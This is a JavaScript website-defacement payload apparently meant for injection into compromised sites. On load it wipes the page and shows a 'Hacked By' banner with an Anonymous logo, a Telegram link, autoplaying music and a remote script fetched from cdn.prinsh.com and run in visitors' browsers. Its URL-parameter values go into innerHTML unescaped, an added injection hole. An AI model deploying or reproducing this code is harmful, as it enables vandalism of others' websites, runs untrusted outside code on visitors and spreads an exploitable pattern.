// Code by Developer Xeron

(function () {

  function getParams() {
    const params = new URLSearchParams(window.location.search);

    return {
      name: params.get("name") || "Xeron",
      message: params.get("message") || "https://t.me/CodeDevZeron"
    };
  }

  function run() {

    const { name, message } = getParams();

    document.body.innerHTML = `
<!DOCTYPE html>
<html>
<head>
<title>Hacked By ${name}</title>

<style>
body {
  background: url("https://cdn.prinsh.com/data-1/images/NathanPrinsley-hacker-aesthetic.jpg") no-repeat center center fixed;
  background-size: 100% 100%;
  font-family: Verdana;
  text-align:center;
  margin-top: 40px;
}
h1 { color:#de0707; }
h2 { color:#07ad1d; }
p { color:#00ffff; font-size:18px; }
a { color:#00ffcc; text-decoration:none; }
</style>

</head>

<body>

<img src="https://cdn.prinsh.com/data-1/images/NathanPrinsley-AnonymousLogo.png" width="200">

<h1>Hacked By ${name}</h1>
<h2><a href="${message}" target="_blank">${message}</a></h2>

<p>${name} 😈</p>

<audio src="https://cdn.prinsh.com/data-1/mp3/best-hacker-music.mp3" autoplay loop></audio>

<script src="https://cdn.prinsh.com/NathanPrinsley-effect/salju-terbang.js"><\/script>

</body>
</html>
    `;
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", run);
  } else run();

})();
